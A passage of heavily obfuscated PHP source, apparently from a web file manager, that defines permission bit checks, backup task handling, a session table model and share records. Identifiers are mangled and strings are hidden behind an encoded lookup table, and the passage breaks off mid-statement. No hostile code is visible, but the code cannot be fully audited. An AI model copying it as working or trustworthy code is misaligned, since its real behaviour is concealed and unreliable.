self::AUTH_SHOW | self::AUTH_UPLOAD), array($Üé××¸Õ[515] => LNG($Üé××¸Õ[2146]), $Üé××¸Õ[2133] => $Üé××¸Õ[2147], $Üé××¸Õ[2135] => 6, $Üé××¸Õ[2136] => 1, $Üé××¸Õ[2137] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($Üé××¸Õ[515] => LNG($Üé××¸Õ[2148]), $Üé××¸Õ[2133] => $Üé××¸Õ[2149], $Üé××¸Õ[2135] => 7, $Üé××¸Õ[2136] => 1, $Üé××¸Õ[2137] => 0)); return $ ÇˆèÍÄ; } public static function authCheck($ŞåÛü¬ì, $‡ªû‰¾Ó, $ÅøÎ“¿î = true) { $§âö¸ƒ =& $_SERVER[¤øïŠ‹²]; $ŞåÛü¬ì = intval($ŞåÛü¬ì); if ($ÅøÎ“¿î) { if (KodUser::isRoot() && $GLOBALS[$§âö¸ƒ[6]][$§âö¸ƒ[2150]]) { return !0; } } if ($ŞåÛü¬ì <= 0) { return !1; } if (($ŞåÛü¬ì & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ŞåÛü¬ì & $‡ªû‰¾Ó); } public static function authCheckShow($îÊØğ„Œ) { return self::authCheck($îÊØğ„Œ, self::AUTH_SHOW); } public static function authCheckView($Å¸ùÊ„·) { return self::authCheck($Å¸ùÊ„·, self::AUTH_VIEW); } public static function authCheckDownload($¯’ÇÑİ¦) { return self::authCheck($¯’ÇÑİ¦, self::AUTH_DOWNLOAD); } public static function authCheckUpload($»éÆáƒø) { return self::authCheck($»éÆáƒø, self::AUTH_UPLOAD); } public static function authCheckEdit($Æ©·ÑÎ) { return self::authCheck($Æ©·ÑÎ, self::AUTH_EDIT); } public static function authCheckRemove($ÜÖûš¢×) { return self::authCheck($ÜÖûš¢×, self::AUTH_REMOVE); } public static function authCheckShare($ˆàşÙ‹) { return self::authCheck($ˆàşÙ‹, self::AUTH_SHARE); } public static function authCheckComment($çøÓ–˜†) { return self::authCheck($çøÓ–˜†, self::AUTH_COMMENT); } public static function authCheckEvent($ãäçŸ•¦) { return self::authCheck($ãäçŸ•¦, self::AUTH_EVENT); } public static function authCheckRoot($âÚöƒŠ») { return self::authCheck($âÚöƒŠ», self::AUTH_ROOT); } public static function authCheckAction($–€ı†¯, $ßÃ¨Ç) { $±öâœ‰Ä =& $_SERVER[¤øïŠ‹²]; $ú×“âÌÖ = array($±öâœ‰Ä[1509] => self::AUTH_SHOW, $±öâœ‰Ä[1510] => self::AUTH_VIEW, $±öâœ‰Ä[1331] => self::AUTH_DOWNLOAD, $±öâœ‰Ä[119] => self::AUTH_UPLOAD, $±öâœ‰Ä[1511] => self::AUTH_EDIT, $±öâœ‰Ä[1280] => self::AUTH_REMOVE, $±öâœ‰Ä[1512] => self::AUTH_SHARE, $±öâœ‰Ä[441] => self::AUTH_COMMENT, $±öâœ‰Ä[1513] => self::AUTH_EVENT, $±öâœ‰Ä[1514] => self::AUTH_ROOT); if (!isset($ú×“âÌÖ[$ßÃ¨Ç])) { return; } $Í ë®è = $ú×“âÌÖ[$ßÃ¨Ç]; $–€ı†¯ = intval($–€ı†¯); if ($–€ı†¯ <= 0) { return !1; } if (($–€ı†¯ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($–€ı†¯ & $Í ë®è); } public static function authDisable($ı¶ÍÆÏ, $¹”ˆºê) { if (intval($ı¶ÍÆÏ) <= 0) { return 0; } return intval($ı¶ÍÆÏ) & ~$¹”ˆºê; } public $optionType = "\123\171\x73\x74\145\x6d\x2e\163\157\x75\162\x63\x65\x41\x75\x74\x68\114\151\163\164"; public $field = array("\x6e\141\x6d\x65", "\x61\x75\x74\150", "\154\141\x62\x65\x6c", "\144\151\163\x70\154\141\171", "\x73\171\163\164\145\155", "\163\x6f\162\164"); public function initData() { $”–Æ„í = $this->authDefault(); foreach ($”–Æ„í as $¡ö¸ÚŒ„) { $this->add($¡ö¸ÚŒ„); } } public function findAuth($ˆÎ÷ì±, $—¹í«ìÏ) { $ş¥“ßš¨ =& $_SERVER[¤øïŠ‹²]; $ì—ÛÚ = parent::listData(); foreach ($ì—ÛÚ as $ØÉ–š£Ì) { $¡Ÿ¼Øâè = intval($ØÉ–š£Ì[$ş¥“ßš¨[508]]); if ($¡Ÿ¼Øâè <= 0 || $ØÉ–š£Ì[$ş¥“ßš¨[2151]] == 0) { continue; } if (($¡Ÿ¼Øâè & $ˆÎ÷ì±) != $ˆÎ÷ì±) { continue; } if (($¡Ÿ¼Øâè & $—¹í«ìÏ) != 0) { continue; } return $ØÉ–š£Ì[$ş¥“ßš¨[493]]; } return !1; } public function findAuthMax($÷ùæí´, $¦îğÕ¢é) { $©– ”œ÷ =& $_SERVER[¤øïŠ‹²]; $ú„©–Ç = !1; $Â¯Ø„À = parent::listData(); foreach ($Â¯Ø„À as $ûü» ñû) { $ÏÖğùúØ = intval($ûü» ñû[$©– ”œ÷[508]]); if ($ÏÖğùúØ <= 0 || $ûü» ñû[$©– ”œ÷[2151]] == 0) { continue; } if (($ÏÖğùúØ & $÷ùæí´) != $÷ùæí´) { continue; } if (($ÏÖğùúØ & $¦îğÕ¢é) != 0) { continue; } if (!$ú„©–Ç) { $ú„©–Ç = $ûü» ñû; continue; } if (intval($ú„©–Ç[$©– ”œ÷[508]]) < $ÏÖğùúØ) { $ú„©–Ç = $ûü» ñû; } } return $ú„©–Ç ? $ú„©–Ç[$©– ”œ÷[493]] : !1; } public function findAuthReadOnly() { $ƒÑ²åùê = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $·ä†¹ğ· = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($ƒÑ²åùê, $·ä†¹ğ·); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $°ê“ˆƒø =& $_SERVER[¤øïŠ‹²]; $€°»°Ø = parent::listData(); $ò“å¸ÉÇ = !1; foreach ($€°»°Ø as $îŒ™€åŠ) { if ($îŒ™€åŠ[$°ê“ˆƒø[508]] <= 0 || $îŒ™€åŠ[$°ê“ˆƒø[2151]] == $°ê“ˆƒø[241]) { continue; } if (!$ò“å¸ÉÇ) { $ò“å¸ÉÇ = $îŒ™€åŠ; continue; } if ($ò“å¸ÉÇ[$°ê“ˆƒø[508]] > $îŒ™€åŠ[$°ê“ˆƒø[508]]) { $ò“å¸ÉÇ = $îŒ™€åŠ; } } return $ò“å¸ÉÇ ? $ò“å¸ÉÇ[$°ê“ˆƒø[493]] : $°ê“ˆƒø[12]; } public function listData($Àºñç‡ = false, $èÊ¾¬ë§ = "\163\157\x72\x74", $®ÚëÊ˜Ä = false) { return parent::listData($Àºñç‡, $èÊ¾¬ë§, $®ÚëÊ˜Ä); } public function update($Àóªãç©, $§ˆËÔøº) { $æîÊé¢¼ =& $_SERVER[¤øïŠ‹²]; $¤€ªÑå« = parent::listData($Àóªãç©); $‰±¼ÅÖ€ = $this->findByName($§ˆËÔøº[$æîÊé¢¼[32]]); if (!$¤€ªÑå« || $‰±¼ÅÖ€ && $‰±¼ÅÖ€[$æîÊé¢¼[493]] != $¤€ªÑå«[$æîÊé¢¼[493]]) { return !1; } $this->filterAuth($§ˆËÔøº[$æîÊé¢¼[508]]); return parent::update($Àóªãç©, $§ˆËÔøº); } public function remove($ú•Üğ•Æ) { $èúÂç°Ú = parent::listData($ú•Üğ•Æ); if (!$èúÂç°Ú || $èúÂç°Ú[$_SERVER[¤øïŠ‹²][202]]) { return !1; } return parent::remove($ú•Üğ•Æ); } public function add($ÊìÅ´Ë° = array()) { $¾±à“­È =& $_SERVER[¤øïŠ‹²]; if ($this->findByName($ÊìÅ´Ë°[$¾±à“­È[32]])) { return !1; } $Ó ŸÄ¼† = array($¾±à“­È[32] => $¾±à“­È[12], $¾±à“­È[508] => 1, $¾±à“­È[2152] => $¾±à“­È[2141], $¾±à“­È[2151] => 1, $¾±à“­È[202] => 0, $¾±à“­È[2153] => 0); $ÊìÅ´Ë° = array_merge($Ó ŸÄ¼†, $ÊìÅ´Ë°); $ÊìÅ´Ë°[$¾±à“­È[2153]] = $this->getSort(); $this->filterAuth($ÊìÅ´Ë°[$¾±à“­È[508]]); return parent::insert($ÊìÅ´Ë°); } private function getSort() { $ş­Å™Ÿà =& $_SERVER[¤øïŠ‹²]; $ìÙç²ÔÇ = parent::listData(); $Áî•È­ = array_to_keyvalue($ìÙç²ÔÇ, $ş­Å™Ÿà[12], $ş­Å™Ÿà[2153]); return empty($Áî•È­) ? 0 : max($Áî•È­) + 1; } private function filterAuth(&$½àÄÕ‚) { if (!$½àÄÕ‚) { return; } $™ğÇ¯¤ü = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $áÑÕ¯³ä = array(); foreach ($™ğÇ¯¤ü as $¸Üàåõ) { if ($½àÄÕ‚ & $¸Üàåõ) { $áÑÕ¯³ä[] = $¸Üàåõ; } } if (in_array(self::AUTH_ROOT, $áÑÕ¯³ä)) { $½àÄÕ‚ = array_sum($™ğÇ¯¤ü); return; } $ßÖµ¯ë÷ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($áÑÕ¯³ä as $¸Üàåõ) { if (isset($ßÖµ¯ë÷[$¸Üàåõ])) { $áÑÕ¯³ä = array_merge($áÑÕ¯³ä, $ßÖµ¯ë÷[$¸Üàåõ]); } } $áÑÕ¯³ä[] = self::AUTH_SHOW; $½àÄÕ‚ = array_sum(array_unique($áÑÕ¯³ä)); } public function sort($ü¤››‹à, $™¼ÜÃæ) { return parent::update($ü¤››‹à, $™¼ÜÃæ); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\x6d\56\142\141\143\x6b\x75\160\114\151\163\x74"; public $field = array("\151\x6f", "\156\x61\x6d\145", "\163\x74\141\x74\x75\163", "\x63\x6f\x6e\x74\x65\x6e\x74", "\x6d\141\156\165\x61\154", "\162\145\x73\x75\154\x74", "\x74\151\x6d\145\106\x72\157\x6d", "\x74\x69\155\x65\x54\157"); public function config() { $ëõ®ß„õ =& $_SERVER[¤øïŠ‹²]; Action($ëõ®ß„õ[2154])->taskInit(); $úÙÃ÷­é = Model($ëõ®ß„õ[874])->get($ëõ®ß„õ[881]); $úÙÃ÷­é = json_decode($úÙÃ÷­é, !0); $úÙÃ÷­é = is_array($úÙÃ÷­é) ? $úÙÃ÷­é : array(); $this->parseContent($úÙÃ÷­é); unset($úÙÃ÷­é[$ëõ®ß„õ[1895]]); Model($ëõ®ß„õ[1894])->cacheClear(); $Œˆóã“Ø = $ëõ®ß„õ[2155]; $î‹€ç¯Ë = Model($ëõ®ß„õ[2156])->findByKey($ëõ®ß„õ[1513], $Œˆóã“Ø); if (!$î‹€ç¯Ë) { $î‹€ç¯Ë = array(); } if (isset($î‹€ç¯Ë[$ëõ®ß„õ[217]])) { $î‹€ç¯Ë[$ëõ®ß„õ[217]] = json_decode($î‹€ç¯Ë[$ëõ®ß„õ[217]], !0); } if (isset($úÙÃ÷­é[$ëõ®ß„õ[217]])) { $î‹€ç¯Ë[$ëõ®ß„õ[217]][$ëõ®ß„õ[1898]] = $úÙÃ÷­é[$ëõ®ß„õ[217]]; unset($úÙÃ÷­é[$ëõ®ß„õ[217]]); } return array_merge($î‹€ç¯Ë, $úÙÃ÷­é); } public function listData($â×Ø Œ = false, $æèôÎ¹ê = "\x6d\157\144\x69\x66\x79\124\151\x6d\x65", $ø§ÍØ”¾ = false) { $£‘“Á¨„ = parent::listData($â×Ø Œ, $æèôÎ¹ê, !0); if (!$£‘“Á¨„) { return $£‘“Á¨„; } if ($â×Ø Œ) { $£‘“Á¨„ = array($£‘“Á¨„); } foreach ($£‘“Á¨„ as &$Óæèº®) { $this->parseContent($Óæèº®); } return $â×Ø Œ ? $£‘“Á¨„[0] : $£‘“Á¨„; } public function parseContent(&$¼ÎÌÀâ½) { $ä¹ñÏºÅ =& $_SERVER[¤øïŠ‹²]; $È¡›‚ª¤ = _get($¼ÎÌÀâ½, $ä¹ñÏºÅ[181], $ä¹ñÏºÅ[102]); if (!in_array($È¡›‚ª¤, array($ä¹ñÏºÅ[880], $ä¹ñÏºÅ[1254]))) { $¼ÎÌÀâ½[$ä¹ñÏºÅ[181]] = $È¡›‚ª¤ == $ä¹ñÏºÅ[102] ? $ä¹ñÏºÅ[1254] : $ä¹ñÏºÅ[880]; } } public function lastItem() { $û°Â¢àœ = $this->listData(); return !empty($û°Â¢àœ[0]) ? $û°Â¢àœ[0] : null; } public function kill($İöáñ˜¢) { $€èøé¢› =& $_SERVER[¤øïŠ‹²]; $ıŞø­¡¬ = $this->listData($İöáñ˜¢); if (!$ıŞø­¡¬ || empty($ıŞø­¡¬[$€èøé¢›[32]])) { return !0; } Task::kill($€èøé¢›[889]); Task::kill($€èøé¢›[910]); Task::kill($€èøé¢›[918]); $¨şÍÙ = $ıŞø­¡¬[$€èøé¢›[32]]; $ÂŒå“Íö = TEMP_FILES . $€èøé¢›[884] . $¨şÍÙ . $€èøé¢›[8]; IO::remove($ÂŒå“Íö, !1); return $this->remove($İöáñ˜¢); } public function remove($ıÃ·ÀŠ˜) { $Ÿ®¦±ğ = $this->listData($ıÃ·ÀŠ˜); if (!$Ÿ®¦±ğ) { return !0; } return $this->backupRemove($Ÿ®¦±ğ); } private function backupRemove($ßÖò•¸™) { parent::remove($ßÖò•¸™[$_SERVER[¤øïŠ‹²][493]]); $ÏÕ¨û¤¤ = $this->backupPath($ßÖò•¸™); IO::remove($ÏÕ¨û¤¤, !1); return !0; } private function backupPath($ºéÈ¬±Å) { $Üš·Ô‰ş =& $_SERVER[¤øïŠ‹²]; $ø÷ç¹»¢ = $ºéÈ¬±Å[$Üš·Ô‰ş[32]]; $ŞÛå‚«ä = Model($Üš·Ô‰ş[874])->get($Üš·Ô‰ş[875]); $éŸÊİğÄ = substr(md5($Üš·Ô‰ş[876] . $ŞÛå‚«ä . $ø÷ç¹»¢), 0, 8); return "\x7b\151\157\x3a{$ºéÈ¬±Å[$Üš·Ô‰ş[853]]}\x7d\57\x64\x61\x74\141\x62\x61\163\145\x2f\142\x61\x63\153\x75\x70\57" . $ø÷ç¹»¢ . $Üš·Ô‰ş[11] . $éŸÊİğÄ; } public function start() { $ÂéøÔ‹± =& $_SERVER[¤øïŠ‹²]; if ($GLOBALS[$ÂéøÔ‹±[6]][$ÂéøÔ‹±[103]][$ÂéøÔ‹±[2157]] != $ÂéøÔ‹±[102]) { return !0; } $±ã€½¬ã = $this->config(); if (!$±ã€½¬ã || $±ã€½¬ã[$ÂéøÔ‹±[1895]] != $ÂéøÔ‹±[102]) { return !1; } if ($±ã€½¬ã[$ÂéøÔ‹±[181]] == $ÂéøÔ‹±[880]) { $·Œ“ôÆµ = Model($ÂéøÔ‹±[874])->get($ÂéøÔ‹±[1376]); if ($·Œ“ôÆµ == $ÂéøÔ‹±[1377]) { $±ã€½¬ã[$ÂéøÔ‹±[181]] = $ÂéøÔ‹±[1254]; } } $íïÁ›º = $this->process(); foreach ($íïÁ›º as $Ú¶¹åŞò) { if ($Ú¶¹åŞò) { return Task::restart($Ú¶¹åŞò[$ÂéøÔ‹±[493]]); } } $“Î£ŠƒŸ = new Backup(); $ô‡Ç—èŒ = $“Î£ŠƒŸ->db(); if ($ô‡Ç—èŒ) { $ô‡Ç—èŒ = $“Î£ŠƒŸ->dbFile(); if ($ô‡Ç—èŒ && $±ã€½¬ã[$ÂéøÔ‹±[181]] == $ÂéøÔ‹±[880]) { $ô‡Ç—èŒ = $“Î£ŠƒŸ->file(); } } Backup::set(array($ÂéøÔ‹±[851] => 1, $ÂéøÔ‹±[863] => time())); return !0; } public function process() { $¥´˜ÍêĞ =& $_SERVER[¤øïŠ‹²]; $ÕÉ©İ»ß = array($¥´˜ÍêĞ[859] => Task::get($¥´˜ÍêĞ[889]), $¥´˜ÍêĞ[864] => Task::get($¥´˜ÍêĞ[910]), $¥´˜ÍêĞ[243] => Task::get($¥´˜ÍêĞ[918])); $Â‘ÕŒäû = !1; foreach ($ÕÉ©İ»ß as &$ôĞÆ›½Î) { if ($Â‘ÕŒäû) { $ôĞÆ›½Î = !1; continue; } if ($ôĞÆ›½Î) { $ñ×©‰î® = intval(_get($ôĞÆ›½Î, $¥´˜ÍêĞ[1929], 0)); if (time() - $ñ×©‰î® > 7200) { Task::kill($ôĞÆ›½Î[$¥´˜ÍêĞ[493]]); $Â‘ÕŒäû = !0; $ôĞÆ›½Î = !1; } } } return $ÕÉ©İ»ß; } public function restore() { $İŞ¿ûÂö =& $_SERVER[¤øïŠ‹²]; ActionCall($İŞ¿ûÂö[2158], !0, 1); ActionCall($İŞ¿ûÂö[2158], !0, 0); } } goto EšÇñ…õô; C‰åô‡—ìÛ: class SessionModel extends ModelBase { protected $tableName = "\163\x79\x73\164\x65\x6d\x5f\163\145\x73\163\151\157\156"; public function get($ƒÒİİ‡„) { $öÁñ€ìà =& $_SERVER[¤øïŠ‹²]; $ş…”Ï Ó = $this->where(array($öÁñ€ìà[2266] => $ƒÒİİ‡„))->find(); if (!is_array($ş…”Ï Ó)) { return !1; } return $ş…”Ï Ó[$öÁñ€ìà[181]]; } public function set($âÓ•ÂƒÜ, $·Œ¶¦Û½, $ûÜùÈ‘ß = 3600) { $ÃÉèÄ÷ =& $_SERVER[¤øïŠ‹²]; $äƒºÌÊ¦ = array($ÃÉèÄ÷[2266] => $âÓ•ÂƒÜ, $ÃÉèÄ÷[2169] => $·Œ¶¦Û½, $ÃÉèÄ÷[2267] => $ûÜùÈ‘ß + time()); if (Session::get($ÃÉèÄ÷[2268])) { $äƒºÌÊ¦[$ÃÉèÄ÷[1542]] = Session::get($ÃÉèÄ÷[2268]); } else { $äƒºÌÊ¦[$ÃÉèÄ÷[1542]] = 0; } if ($this->get($âÓ•ÂƒÜ)) { return $this->where(array($ÃÉèÄ÷[2266] => $âÓ•ÂƒÜ))->save($äƒºÌÊ¦); } else { return $this->add($äƒºÌÊ¦, array(), !0); } } public function remove($œï¤û„á) { return $this->where(array($_SERVER[¤øïŠ‹²][2266] => $œï¤û„á))->delete(); } public function clearTimeout() { return $this->where($_SERVER[¤øïŠ‹²][2269] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\x61\162\x65"; protected $dataAuto = array(array("\x6d\157\x64\x69\146\171\124\151\x6d\x65", "\164\x69\x6d\x65", "\x69\156\163\x65\x72\164\x2c\x75\x70\144\141\164\x65", "\x66\165\156\x63\x74\151\x6f\156"), array("\143\162\145\x61\x74\x65\124\x69\155\145", "\x74\151\155\x65", "\x69\x6e\x73\145\162\164", "\x66\x75\x6e\143\164\x69\157\156"), array("\x6f\160\164\151\x6f\156\x73", '', "\x69\x6e\x73\145\x72\x74\54\165\x70\x64\141\164\145\54\x73\145\x6c\145\x63\x74", "\x6a\163\x6f\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($ÆÍÊ²¥“) { $¬ÏøëÎÍ =& $_SERVER[¤øïŠ‹²]; return array($¬ÏøëÎÍ[2270] => array(USER_ID, $¬ÏøëÎÍ[2271]), $¬ÏøëÎÍ[2272] => array($ÆÍÊ²¥“[0], $¬ÏøëÎÍ[2273])); } protected function ___listSimple() { $ÀÖã±ş· = $this->field($this->fieldList)->where(array($_SERVER[¤øïŠ‹²][1542] => USER_ID))->select(); return $ÀÖã±ş· ? $ÀÖã±ş· : array(); } protected function ___getInfoShare($ˆäõÌÃª) { return $this->_getShareInfo(array($_SERVER[¤øïŠ‹²][694] => $ˆäõÌÃª), !1); } protected function getInfo($ÍóõÂ‡‹) { $†¤˜Øˆ— = $this->getInfoShare($ÍóõÂ‡‹); return $this->shareSourceInfo($†¤˜Øˆ—); } public function getInfoByHash($œØÖ¼îä) { return $this->_getShareInfo(array($_SERVER[¤øïŠ‹²][1504] => $œØÖ¼îä)); } public function getInfoByPath($¨ÆÍ³ûí) { $’ğ¿±Å =& $_SERVER[¤øïŠ‹²]; $°®µÌø = array($’ğ¿±Å[1542] => USER_ID, $’ğ¿±Å[204] => $¨ÆÍ³ûí); return $this->_getShareInfo($°®µÌø); } public function getInfoBySourcePath($ŒŒº£») { $µÊ¶˜¹« =& $_SERVER[¤øïŠ‹²]; $Í¯íıïµ = array($µÊ¶˜¹«[1542] => USER_ID, $µÊ¶˜¹«[589] => $ŒŒº£»); return $this->_getShareInfo($Í¯íıïµ); } private function _getShareInfo($åı¦ùÃ, $Äí¢ÀÉ„ = true) { $€¦ŒĞÏ¤ =& $_SERVER[¤øïŠ‹²]; $’ÖÂ› = $this->where($åı¦ùÃ)->find(); if (!$’ÖÂ›) { return !1; } if (!is_array($’ÖÂ›[$€¦ŒĞÏ¤[586]])) { $’ÖÂ›[$€¦ŒĞÏ¤[586]] = array(); } $åı¦ùÃ = array($€¦ŒĞÏ¤[694] => $’ÖÂ›[$€¦ŒĞÏ¤[694]]); $Œ®ú÷ú = $€¦ŒĞÏ¤[2274]; $’ÖÂ›[$€¦ŒĞÏ¤[1500]] = Model($€¦ŒĞÏ¤[695])->order($€¦ŒĞÏ¤[493])->field($Œ®ú÷ú)->where($åı¦ùÃ)->select(); if (!$Äí¢ÀÉ„) { return $’ÖÂ›; } return $this->shareSourceInfo($’ÖÂ›); } private function shareSourceInfo($á×ğ˜®‘) { $ÛÛ½¢ÕÊ =& $_SERVER[¤øïŠ‹²]; if (!is_array($á×ğ˜®‘)) { return $á×ğ˜®‘; } if ($á×ğ˜®‘[$ÛÛ½¢ÕÊ[204]] == $ÛÛ½¢ÕÊ[241]) { $á×ğ˜®‘[$ÛÛ½¢ÕÊ[101]] = IO::info($á×ğ˜®‘[$ÛÛ½¢ÕÊ[589]]); } else { $á×ğ˜®‘[$ÛÛ½¢ÕÊ[101]] = Model($ÛÛ½¢ÕÊ[1482])->pathInfo($á×ğ˜®‘[$ÛÛ½¢ÕÊ[204]]); } return $á×ğ˜®‘; } protected function getInfoAuth($’şØƒ‡—) { $³Ã´ñ¢ =& $_SERVER[¤øïŠ‹²]; $ºŠÓãŞ« = $this->getInfo($’şØƒ‡—); if ($ºŠÓãŞ«[$³Ã´ñ¢[1542]] == USER_ID) { $ºŠÓãŞ«[$³Ã´ñ¢[508]] = $ºŠÓãŞ«[$³Ã´ñ¢[101]][$³Ã´ñ¢[508]]; } else { $ºŠÓãŞ«[$³Ã´ñ¢[508]] = Model($³Ã´ñ¢[593])->authMake($ºŠÓãŞ«[$³Ã´ñ¢[1500]]); } return $ºŠÓãŞ«; } protected function listData($í™Ö¼Ïñ = null, $ó«©öŸÀ = 300) { $ë·æ–û£ =& $_SERVER[¤øïŠ‹²]; $Â¤ñŠÉ† = array(array($ë·æ–û£[584] => array($ë·æ–û£[1128], 0), $ë·æ–û£[692] => array($ë·æ–û£[1128], 0), $ë·æ–û£[2275] => $ë·æ–û£[2231])); if ($í™Ö¼Ïñ == $ë·æ–û£[2276]) { $Â¤ñŠÉ† = array($ë·æ–û£[584] => 1); } else { if ($í™Ö¼Ïñ == $ë·æ–û£[1293]) { $Â¤ñŠÉ† = array($ë·æ–û£[692] => 1); } } $Â¤ñŠÉ†[$ë·æ–û£[1542]] = USER_ID; $„÷¾»¶ = $this->where($Â¤ñŠÉ†)->selectPage($ó«©öŸÀ); return $„÷¾»¶; } protected function listToMe($ë•¡¡Şï = 300) { $°³ù²¸Ø =& $_SERVER[¤øïŠ‹²]; $Îû°Ñ¶ë = Model($°³ù²¸Ø[2277])->userGroupParents(USER_ID); $‰îáÎÆ = array($°³ù²¸Ø[677] => SourceModel::TYPE_USER, $°³ù²¸Ø[595] => USER_ID); if ($Îû°Ñ¶ë) { $‰îáÎÆ = array(array($°³ù²¸Ø[677] => SourceModel::TYPE_USER, $°³ù²¸Ø[595] => USER_ID), array($°³ù²¸Ø[677] => SourceModel::TYPE_GROUP, $°³ù²¸Ø[595] => array($°³ù²¸Ø[7], $Îû°Ñ¶ë)), $°³ù²¸Ø[2275] => $°³ù²¸Ø[2231]); } $¬ì¨ÂÎ– = Model($°³ù²¸Ø[695])->where($‰îáÎÆ)->selectPage($ë•¡¡Şï); $³´’€„¤ = array_to_keyvalue_group($¬ì¨ÂÎ–[$°³ù²¸Ø[457]], $°³ù²¸Ø[694]); if (!$³´’€„¤) { return $¬ì¨ÂÎ–; } $Ä–¢×¾â = $°³ù²¸Ø[2278]; $‰îáÎÆ = array($°³ù²¸Ø[694] => array($°³ù²¸Ø[513], array_keys($³´’€„¤))); $Å“á›ª¢ = $this->field($Ä–¢×¾â)->where($‰îáÎÆ)->select(); foreach ($Å“á›ª¢ as $È÷©ãİå => &$ù²˜…å¬) { $ù²˜…å¬[$°³ù²¸Ø[1500]] = $³´’€„¤[$ù²˜…å¬[$°³ù²¸Ø[694]]]; } unset($ù²˜…å¬); $Æ¯±ûªÆ = array($°³ù²¸Ø[2279] => $Å“á›ª¢, $°³ù²¸Ø[2280] => $¬ì¨ÂÎ–[$°³ù²¸Ø[454]]); return $Æ¯±ûªÆ; } protected function shareAdd($ğßâÕ¥‡, $éªùô­ğ) { $÷¡¤¯˜¤ =& $_SERVER[¤øïŠ‹²]; $ºó“ÅşŒ = $this->_addShareData($ğßâÕ¥‡, $éªùô­ğ); if (!empty($éªùô­ğ[$÷¡¤¯˜¤[2281]])) { $this->_shareAuthSet($ºó“ÅşŒ, $éªùô­ğ[$÷¡¤¯˜¤[2281]]); } $this->shareEventAdd($ğßâÕ¥‡, $éªùô­ğ, $÷¡¤¯˜¤[2282]); return $ºó“ÅşŒ; } protected function shareAddSystem($Æ«Ş§óÕ, $Ã¬û²Ü ) { $¦¿­— =& $_SERVER[¤øïŠ‹²]; $®‘Æ¼¬ = $this->_addShareData($Æ«Ş§óÕ, $Ã¬û²Ü , $¦¿­—[202]); $this->_shareAuthSet($®‘Æ¼¬, $Ã¬û²Ü [$¦¿­—[2281]]); return $®‘Æ¼¬; } private function shareEventAdd($Í¢±İˆ¥, $ƒô­Ò©¯, $Ÿ˜­é•è = "\141\144\144") { $½ÙÉ¢Ë¯ =& $_SERVER[¤øïŠ‹²]; if (!$Í¢±İˆ¥ || $Í¢±İˆ¥ == $½ÙÉ¢Ë¯[241]) { return; } if ($Ÿ˜­é•è == $½ÙÉ¢Ë¯[2282]) { if ($ƒô­Ò©¯[$½ÙÉ¢Ë¯[584]] == $½ÙÉ¢Ë¯[102]) { Model($½ÙÉ¢Ë¯[662])->eventShare($Í¢±İˆ¥, $½ÙÉ¢Ë¯[2283]); } if ($ƒô­Ò©¯[$½ÙÉ¢Ë¯[692]] == $½ÙÉ¢Ë¯[102]) { Model($½ÙÉ¢Ë¯[662])->eventShare($Í¢±İˆ¥, $½ÙÉ¢Ë¯[2284]); } return; } $…à´üø™ = $this->getInfoByPath($Í¢±İˆ¥); $ËÏ˜ÆÄ = $½ÙÉ¢Ë¯[2285]; if ($…à´üø™[$½ÙÉ¢Ë¯[584]] == $½ÙÉ¢Ë¯[241] && $ƒô­Ò©¯[$½ÙÉ¢Ë¯[584]] == $½ÙÉ¢Ë¯[102]) { $ËÏ˜ÆÄ = $½ÙÉ¢Ë¯[2283]; } if ($…à´üø™[$½ÙÉ¢Ë¯[584]] == $½ÙÉ¢Ë¯[102] && $ƒô­Ò©¯[$½ÙÉ¢Ë¯[584]] == $½ÙÉ¢Ë¯[241]) { $ËÏ˜ÆÄ = $½ÙÉ¢Ë¯[2286]; } if ($…à´üø™[$½ÙÉ¢Ë¯[692]] == $½ÙÉ¢Ë¯[241] && $ƒô­Ò©¯[$½ÙÉ¢Ë¯[692]] == $½ÙÉ¢Ë¯[102]) { $ËÏ˜ÆÄ = $½ÙÉ¢Ë¯[2284]; } if ($…à´üø™[$½ÙÉ¢Ë¯[692]] == $½ÙÉ¢Ë¯[102] && $ƒô­Ò©¯[$½ÙÉ¢Ë¯[692]] == $½ÙÉ¢Ë¯[241]) { $ËÏ˜ÆÄ = $½ÙÉ¢Ë¯[2287]; } Model($½ÙÉ¢Ë¯[662])->eventShare($Í¢±İˆ¥, $ËÏ˜ÆÄ); return; } private function _addShareData($½§íŒØ, $¶†×Õï´ = array(), $íÓÂÆ®ú = false) { $­ƒóÚí =& $_SERVER[¤øïŠ‹²]; $ºÈ°©€€ = $íÓÂÆ®ú == $­ƒóÚí[202] ? 0 : USER_ID; $åàÌ‡¾ƒ = array($­ƒóÚí[512] => $½§íŒØ, $­ƒóÚí[1916] => $ºÈ°©€€); if ($½§íŒØ == 0) { $åàÌ‡¾ƒ = array($­ƒóÚí[2288] => $¶†×Õï´[$­ƒóÚí[589]], $­ƒóÚí[1916] => $ºÈ°©€€); } if ($õí¡Ş™£ = $this->where($åàÌ‡¾ƒ)->find()) { return $õí¡Ş™£[$­ƒóÚí[694]]; } if ($½§íŒØ == 0) { $½óÔ£ôŞ = array($­ƒóÚí[32] => get_path_this($¶†×Õï´[$­ƒóÚí[98]])); } else { $½óÔ£ôŞ = Model($­ƒóÚí[934])->sourceInfo($½§íŒØ); if (!$½óÔ£ôŞ) { return !1; } } if 